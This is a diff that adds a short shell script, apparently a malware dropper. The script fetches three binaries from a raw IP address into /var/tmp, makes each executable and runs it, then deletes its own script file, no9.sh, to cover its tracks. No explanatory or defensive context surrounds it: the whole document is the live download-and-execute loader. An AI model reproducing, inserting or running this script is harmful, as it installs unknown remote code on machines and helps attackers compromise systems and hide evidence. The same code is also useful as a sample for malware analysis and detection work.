@@ -1,0 +1,8 @@
+#!/bin/sh 
+ 
+wget -c http://89.34.97.155/mckd3 -P /var/tmp && chmod +x /var/tmp/mckd3 && /var/tmp/mckd3 
+wget -c http://89.34.97.155/cdhh3 -P /var/tmp && chmod +x /var/tmp/cdhh3 && /var/tmp/cdhh3 
+wget -c http://89.34.97.155/djj3i -P /var/tmp && chmod +x /var/tmp/djj3i && /var/tmp/djj3i
+
+sleep 3; 
+rm -fr /var/tmp/no9.sh
